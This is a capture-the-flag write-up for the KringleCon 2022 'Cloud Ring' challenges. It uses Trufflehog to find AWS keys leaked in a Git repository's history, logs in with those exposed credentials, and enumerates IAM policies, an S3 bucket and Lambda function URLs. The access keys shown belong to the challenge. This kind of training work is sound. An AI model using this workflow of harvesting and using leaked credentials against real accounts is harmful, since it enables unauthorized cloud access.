### AWS CLI Intro
![Pasted image 20230104225759](Pasted%20image%2020230104225759.png)
**Q1. Please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 .**
 We follow the given reference https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config
```shell
$ aws configure
AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY
AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf
Default region name [None]: us-east-1
Default output format [None]: json
```
**Q2. To finish, please get your caller identity using the AWS command line. **
```shell
$ aws sts get-caller-identity
{
    "UserId": "AKQAAYRKO7A5Q5XUY2IY",
    "Account": "602143214321",
    "Arn": "arn:aws:iam::602143214321:user/elf_helpdesk"
}
```
### Trufflehog Search 
![Pasted image 20230104230049](Pasted%20image%2020230104230049.png)
**Q1. Use Trufflehog to find secrets in a Git repo.  What's the name of the file that has AWS credentials?**
1. Install trufflehog from https://github.com/trufflesecurity/trufflehog/releases and run it.
```shell
trufflehog git https://haugfactory.com/asnowball/aws_scripts.git

Found unverified result 🐷🔑❓
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAAIDAYRANYAHGQOHD
Email: asnowball <alabaster@northpolechristmastown.local>
Repository: https://haugfactory.com/asnowball/aws_scripts.git
Timestamp: 2022-09-07 07:53:12 -0700 PDT
Line: 6
Commit: 106d33e1ffd53eea753c1365eafc6588398279b5
File: put_policy.py
...(other results omitted from this write-up)
```
2. The first result looks interesting, so we clone the repo and look at the diffs.
```git
git clone https://haugfactory.com/asnowball/aws_scripts.git

git log -- put_policy.py
commit 3476397f95da11a776d4118f1f9ae6c9d4afd0c9
Author: asnowball <alabaster@northpolechristmastown.local>
Date:   Wed Sep 7 07:53:32 2022 -0700

git show 3476397f95da11a776d4118f1f9ae6c9d4afd0c9
--- a/put_policy.py
+++ b/put_policy.py
@@ -4,8 +4,8 @@ import json

 iam = boto3.client('iam',
     region_name='us-east-1',
-    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
-    aws_secret_access_key="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",
+    aws_access_key_id=ACCESSKEYID,
+    aws_secret_access_key=SECRETACCESSKEY,
 )
```
3. Now we run aws configure using the creds that were exposed.
```aws
$ aws configure 
Access Key: AKIAAIDAYRANYAHGQOHD
Secret: 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
zone: us-east-1
format: json

$ aws sts get-caller-identity
{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}
```
We enter *put_policy.py* as the exposed file.

###  Exploitation via AWS CLI
NOTE: This question uses the same terminal as Trufflehog. 

**Q1. Use the AWS CLI to find any policies attached to your user.**
We know the  username is haug  from earlier call to get-caller-identity
```shell
$ aws iam list-attached-user-policies --user-name haug
{
    "AttachedPolicies": [
        {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
        }
    ],
    "IsTruncated": false
}
```
**Q2. View or get the policy that is attached to your user.**
We know the ARN from the AttachedPolicies result.
```shell
$ aws iam get-policy --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
{
    "Policy": {
        "PolicyName": "TIER1_READONLY_POLICY",
        ...
        "DefaultVersionId": "v1",
        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
    }
}
```
**Q3. Attached policies can have versions. View the default version.**
We know the default version is v1 from the DefaultVersionId of get-policy.
```
$ aws iam get-policy-version --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY" --version-id "v1"
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:ListFunctions",
                        "lambda:GetFunctionUrlConfig"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUserPolicy",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::602123424321:user/${aws:username}"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
                },
                {
                    "Effect": "Deny",
                    "Principal": "*",
                   "Action": [
                        "s3:GetObject",
                        "lambda:Invoke*"
                    ],
                    "Resource": "*"
                }
            ]
        },
        ...
    }
}
```
**Q4. List the inline policies associated with your user.**
```shell
$ aws iam list-user-policies --user-name haug
{
    "PolicyNames": [
        "S3Perms"
    ],
    "IsTruncated": false
}
```
**Q5. use the AWS CLI to get the only inline policy for your user.**
We know the policy name (S3Perms) based on the previous call to list-user-policies.
```shell
$ aws iam get-user-policy --user-name haug --policy-name S3Perms
{
    "UserPolicy": {
        "UserName": "haug",
        "PolicyName": "S3Perms",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:ListObjects"
                    ],
                    "Resource": [
                        "arn:aws:s3:::smogmachines3",
                        "arn:aws:s3:::smogmachines3/*"
                    ]
                }
            ]
        }
    },
    "IsTruncated": false
}```
**Q6. The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects.  List those objects!** 
```shell
$ aws s3api list-objects --bucket "smogmachines3" | more
 "IsTruncated": false,
    "Marker": "",
    "Contents": [
        {
            "Key": "coal-fired-power-station.jpg",
            "LastModified": "2022-09-23 20:40:44+00:00",
            "ETag": "\"1c70c98bebaf3cff781a8fd3141c2945\"",
            "Size": 59312,
            "StorageClass": "STANDARD",
            "Owner": {
         "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        ....
        ```
**Q7. The attached user policy provided you with several Lambda privileges. Use the AWS CLI to list Lambda functions.**
```shell
$ aws lambda list-functions | more
{
    "Functions": [
        {
            "FunctionName": "smogmachine_lambda",
            ....
}```
13. Use the AWS CLI to get the configuration containing the public URL of the Lambda function.
```shell
$ aws lambda get-function-url-config --function-name "smogmachine_lambda"
{
    "FunctionUrl": "https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/",
    ...
}
```
And that concludes the Cloud Ring. 
![200](CloudRing.jpg)

Before you leave, remember to grab the treasure chest to the left of the room.
![Pasted image 20230104225636](Pasted%20image%2020230104225636.png)

There will also be a chest en route to the Burning Ring of Fire.
![Pasted image 20230104231937](Pasted%20image%2020230104231937.png)
Jump to: [KringleCon 2022 Orientation](KringleCon%202022%20Orientation.md) | [Tolkien Ring](Tolkien%20Ring.md) | [Elfen Ring](Elfen%20Ring.md) | [Web Ring](Web%20Ring.md)| Cloud Ring|[Burning Ring of Fire](Burning%20Ring%20of%20Fire.md)| [KringleCon 2022 Wrap-up](KringleCon%202022%20Wrap-up.md)